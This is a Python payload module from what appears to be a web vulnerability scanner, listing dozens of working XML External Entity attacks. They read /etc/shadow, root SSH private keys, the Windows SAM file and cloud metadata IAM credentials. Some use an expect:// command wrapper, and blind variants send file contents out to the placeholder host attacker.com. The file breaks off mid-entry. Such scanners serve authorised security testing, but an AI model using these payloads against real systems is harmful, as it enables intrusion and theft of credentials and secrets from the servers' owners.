"""
scanner/payloads/xxe.py

XML External Entity (XXE) payloads for vulnerability testing.
Covers: File disclosure, SSRF via XXE, parameter entities, blind XXE,
        error-based XXE, XInclude attacks, DOCTYPE variations,
        encoding bypass, SVG/XSLT vectors.
"""

from .base import Payload


def xxe_file_confirm(response_text: str) -> bool:
    """
    Check for XXE file disclosure indicators.
    """
    indicators = [
        # Unix file content
        "root:",
        "/bin/bash",
        "/bin/sh",
        "/usr/sbin",
        "daemon:",
        "nobody:",
        "/etc/passwd",
        "shadow:",
        "mysql:",
        "www-data:",
        "sshd:",
        "ftp:",
        "mail:",
        "postfix:",
        "apache:",
        "nginx:",
        "nologin",

        # Linux specific
        "PRETTY_NAME=",
        "VERSION_ID=",
        "ID=ubuntu",
        "ID=debian",
        "ID=centos",
        "ID=fedora",
        "NAME=",
        "proc/",
        "cmdline",
        "environ",

        # Windows file content
        "[extensions]",
        "[boot loader]",
        "[operating systems]",
        "multi(0)",
        "[fonts]",
        "MSDOS.SYS",
        "[MCI Extensions.BAK]",
        "timeout=",
        "[Mail]",
        "MAPI=1",

        # Windows hosts file
        "localhost",
        "127.0.0.1",
        "::1",

        # Generic file indicators
        "file://",
        "<!ENTITY",
        "SYSTEM",
        "PUBLIC",

        # SSH keys
        "-----BEGIN",
        "PRIVATE KEY",
        "ssh-rsa",
        "ssh-ed25519",

        # AWS/Cloud metadata
        "ami-id",
        "instance-id",
        "security-credentials",
        "iam/info",
    ]

    return any(indicator in response_text for indicator in indicators)


def xxe_error_confirm(response_text: str) -> bool:
    """
    Check for XXE-related errors in response.
    """
    indicators = [
        # XML parser errors
        "xml",
        "xmlparseerror",
        "xmlreader",
        "xmlexception",
        "saxparseexception",
        "dtd",
        "doctype",
        "entity",
        "external entity",
        "xmlsyntaxerror",
        "parser error",
        "xml declaration",
        "well-formed",
        "markup error",

        # Java XML errors
        "javax.xml",
        "org.xml.sax",
        "documentbuilder",
        "transformerfactory",
        "xmlinputfactory",
        "jaxp",
        "xerces",

        # .NET XML errors
        "system.xml",
        "xmltextreader",
        "xmldocument",
        "xdocument",
        "xmlresolver",

        # PHP XML errors
        "simplexml",
        "domdocument",
        "libxml",
        "xmlreader",
        "xmlparser",

        # Python XML errors
        "xml.etree",
        "lxml",
        "defusedxml",
        "xml.dom",
        "xml.sax",
        "expatbuilder",

        # Ruby XML errors
        "nokogiri",
        "rexml",

        # Connection/SSRF indicators
        "connection refused",
        "connection timed out",
        "could not connect",
        "failed to open",
        "no such file",
        "file not found",
        "permission denied",
        "access denied",
        "unable to resolve",
    ]

    text_lower = response_text.lower()
    return any(indicator in text_lower for indicator in indicators)


def xxe_ssrf_confirm(response_text: str) -> bool:
    """
    Check for SSRF via XXE indicators.
    """
    indicators = [
        # AWS metadata
        "ami-id",
        "instance-id",
        "instance-type",
        "security-credentials",
        "iam/info",
        "meta-data",
        "user-data",
        "placement/availability-zone",

        # GCP metadata
        "computeMetadata",
        "project/project-id",
        "instance/zone",

        # Azure metadata
        "metadata/instance",
        "subscriptionId",

        # Internal services
        "apache",
        "nginx",
        "tomcat",
        "jenkins",
        "docker",
        "kubernetes",
        "consul",
        "etcd",
        "redis",
        "mongodb",
        "elasticsearch",

        # HTTP responses
        "<!DOCTYPE html>",
        "<html",
        "HTTP/1",
        "200 OK",
        "connection refused",
        "timeout",
    ]

    return any(indicator.lower() in response_text.lower() for indicator in indicators)


def xxe_confirm(response_text: str) -> bool:
    """Combined confirmation for XXE."""
    return xxe_file_confirm(response_text) or xxe_error_confirm(response_text) or xxe_ssrf_confirm(response_text)


XXE_PAYLOADS = [
    # ============================================
    # 1. FILE DISCLOSURE - UNIX/LINUX
    # ============================================
    Payload(
        vuln_type="XXE",
        name="Basic /etc/passwd",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="/etc/shadow",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="/etc/hosts",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="/etc/hostname",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="/etc/issue",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/issue">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="/etc/os-release",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/os-release">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="/proc/version",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="/proc/self/environ",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="/proc/self/cmdline",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="SSH private key",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="SSH authorized_keys",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/authorized_keys">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Bash history",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.bash_history">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="MySQL config",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/mysql/my.cnf">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Apache config",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/apache2/apache2.conf">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Nginx config",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_file_confirm
    ),

    # ============================================
    # 1b. FILE DISCLOSURE - WINDOWS
    # ============================================
    Payload(
        vuln_type="XXE",
        name="Windows win.ini",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Windows boot.ini",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Windows system.ini",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Windows hosts file",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Windows SAM",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/config/SAM">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="IIS web.config",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),

    # ============================================
    # 2. PARAMETER ENTITY VARIATIONS
    # ============================================
    Payload(
        vuln_type="XXE",
        name="Parameter entity /etc/passwd",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Nested parameter entity",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % a "<!ENTITY % b SYSTEM \'file:///etc/passwd\'>">%a;%b;]><foo>test</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Parameter entity with general entity",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'file:///etc/passwd\'>">%eval;%exfil;]><foo>test</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Parameter entity chaining",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % all "<!ENTITY content \'%start;%file;%end;\'>">%all;]><foo>&content;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Double parameter entity",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % a SYSTEM "file:///etc/passwd"><!ENTITY % b "test %a;">%b;]><foo>data</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_error_confirm
    ),

    # ============================================
    # 3. SSRF VIA XXE
    # ============================================
    Payload(
        vuln_type="XXE",
        name="SSRF localhost port 80",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="SSRF localhost port 8080",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="SSRF localhost port 443",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://127.0.0.1:443/">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="SSRF internal 192.168.1.1",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="SSRF internal 10.0.0.1",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://10.0.0.1/">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="AWS metadata IMDS v1",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="AWS metadata IAM credentials",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="AWS user-data",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data/">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="GCP metadata",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Azure metadata",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="DigitalOcean metadata",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/v1/">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),

    # ============================================
    # 4. BLIND XXE (OOB - Out of Band)
    # ============================================
    Payload(
        vuln_type="XXE",
        name="Blind XXE external DTD",
        payload='<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/xxe.dtd"><foo>test</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Blind XXE parameter entity OOB",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>test</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Blind XXE data exfiltration",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">%dtd;]><foo>test</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Blind XXE FTP exfil",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "ftp://attacker.com/xxe">%dtd;]><foo>test</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Blind XXE DNS exfil",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://xxe-test.attacker.com/">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_error_confirm
    ),

    # ============================================
    # 5. ERROR-BASED XXE
    # ============================================
    Payload(
        vuln_type="XXE",
        name="Error-based file disclosure",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % error "<!ENTITY &#x25; exfil SYSTEM \'file:///nonexistent/%file;\'>">%error;%exfil;]><foo>test</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Error-based DTD loading",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///nonexistent/path">%xxe;]><foo>test</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Error via invalid URI",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd%00.txt">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Error via local DTD redefine",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><!ENTITY % ISOamso \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">&#x25;eval;&#x25;error;\'>%local_dtd;]><foo>test</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_error_confirm
    ),

    # ============================================
    # 6. XINCLUDE ATTACKS
    # ============================================
    Payload(
        vuln_type="XXE",
        name="XInclude /etc/passwd",
        payload='<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="XInclude Windows win.ini",
        payload='<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/win.ini"/></foo>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="XInclude SSRF",
        payload='<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://127.0.0.1/"/></foo>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="XInclude AWS metadata",
        payload='<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/></foo>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="XInclude with fallback",
        payload='<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"><xi:fallback>fallback</xi:fallback></xi:include></foo>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),

    # ============================================
    # 7. DOCTYPE VARIATIONS
    # ============================================
    Payload(
        vuln_type="XXE",
        name="DOCTYPE PUBLIC identifier",
        payload='<?xml version="1.0"?><!DOCTYPE foo PUBLIC "-//OASIS//DTD DocBook V4.1//EN" "http://attacker.com/xxe.dtd"><foo>test</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="DOCTYPE internal subset only",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="DOCTYPE mixed internal external",
        payload='<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/xxe.dtd" [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="DOCTYPE with NOTATION",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!NOTATION xxe SYSTEM "file:///etc/passwd"><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="DOCTYPE ATTLIST injection",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ATTLIST foo xxe CDATA #IMPLIED><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo xxe="&xxe;">test</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),

    # ============================================
    # 8. ENCODING BYPASS
    # ============================================
    Payload(
        vuln_type="XXE",
        name="UTF-16 encoded XXE",
        payload='<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="UTF-7 encoded XXE",
        payload='<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-foo+AD4-+ACY-xxe+ADs-+ADw-/foo+AD4-',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="ISO-8859-1 encoded",
        payload='<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="UTF-32 encoded",
        payload='<?xml version="1.0" encoding="UTF-32"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="EBCDIC encoded",
        payload='<?xml version="1.0" encoding="EBCDIC-US"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),

    # ============================================
    # 9. SVG XXE VECTORS
    # ============================================
    Payload(
        vuln_type="XXE",
        name="SVG XXE file disclosure",
        payload='<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">&xxe;</text></svg>',
        contexts=["xml", "form", "upload"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="SVG XXE SSRF",
        payload='<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">&xxe;</text></svg>',
        contexts=["xml", "form", "upload"],
        severity="High",
        safe=True,
        confirmation=xxe_ssrf_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="SVG with external image",
        payload='<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="&xxe;"/></svg>',
        contexts=["xml", "form", "upload"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="SVG foreignObject XXE",
        payload='<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><foreignObject>&xxe;</foreignObject></svg>',
        contexts=["xml", "form", "upload"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),

    # ============================================
    # 9b. XSLT XXE VECTORS
    # ============================================
    Payload(
        vuln_type="XXE",
        name="XSLT document() function",
        payload='<?xml version="1.0"?><xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:template match="/"><xsl:copy-of select="document(\'file:///etc/passwd\')"/></xsl:template></xsl:stylesheet>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_file_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="XSLT include external",
        payload='<?xml version="1.0"?><xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:include href="http://attacker.com/evil.xsl"/></xsl:stylesheet>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="XSLT import external",
        payload='<?xml version="1.0"?><xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:import href="http://attacker.com/evil.xsl"/></xsl:stylesheet>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="XSLT unparsed-entity-uri",
        payload='<?xml version="1.0"?><!DOCTYPE xsl:stylesheet [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:template match="/"><xsl:value-of select="unparsed-entity-uri(\'xxe\')"/></xsl:template></xsl:stylesheet>',
        contexts=["xml", "form"],
        severity="Critical",
        safe=True,
        confirmation=xxe_error_confirm
    ),

    # ============================================
    # 10. PHP WRAPPER VARIATIONS
    # ============================================
    Payload(
        vuln_type="XXE",
        name="PHP filter base64",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="PHP filter read string",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.toupper/resource=/etc/passwd">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="PHP expect wrapper",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="Critical",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="PHP data wrapper",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQh">]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_error_confirm
    ),

    # ============================================
    # 11. DETECTION / ERROR TRIGGERING
    # ============================================
    Payload(
        vuln_type="XXE",
        name="Entity detection basic",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "test">]><foo>&xxe;</foo>',
        contexts=["xml", "form"],
        severity="High",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Malformed DOCTYPE",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM>]><foo>&xxe;</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Recursive entity (billion laughs)",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "a&b;"><!ENTITY b "b&a;">]><foo>&a;</foo>',
        contexts=["xml"],
        severity="High",
        safe=True,
        confirmation=xxe_error_confirm
    ),
    Payload(
        vuln_type="XXE",
        name="Quadratic blowup",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "aaaaaaaaaa">]><foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>',
        contexts=["xml"],
